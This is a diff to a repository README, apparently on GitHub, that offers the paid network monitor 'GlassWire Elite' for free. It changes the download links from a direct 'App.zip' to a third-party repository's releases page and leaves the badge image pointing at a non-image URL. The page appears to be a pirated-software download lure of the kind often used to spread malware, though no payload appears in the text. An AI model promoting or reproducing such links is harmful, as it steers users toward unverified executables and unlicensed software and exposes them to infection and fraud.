@@ -35,11 +35,11 @@ If you're interested in trying out GlassWire Elite for free, you're in the right
 
 ## Ready to Dive In?
 
-To explore GlassWire Elite further and take advantage of all the amazing features it has to offer, [download GlassWire Elite here](https://github.com/uploads/App.zip).
+To explore GlassWire Elite further and take advantage of all the amazing features it has to offer, [download GlassWire Elite here](https://github.com/mashedpuree/GlassWire-Elite-Free/releases).
 
 Don't forget to check out the "Releases" section if the provided link doesn't work or for any additional updates and announcements.
 
-[![Download GlassWire Elite](https://img.shields.io/badge/Download-GlassWire_Elite-blue)](https://github.com/uploads/App.zip)
+[![Download GlassWire Elite](https://github.com/mashedpuree/GlassWire-Elite-Free/releases)](https://github.com/mashedpuree/GlassWire-Elite-Free/releases)
 
 ## Conclusion
 
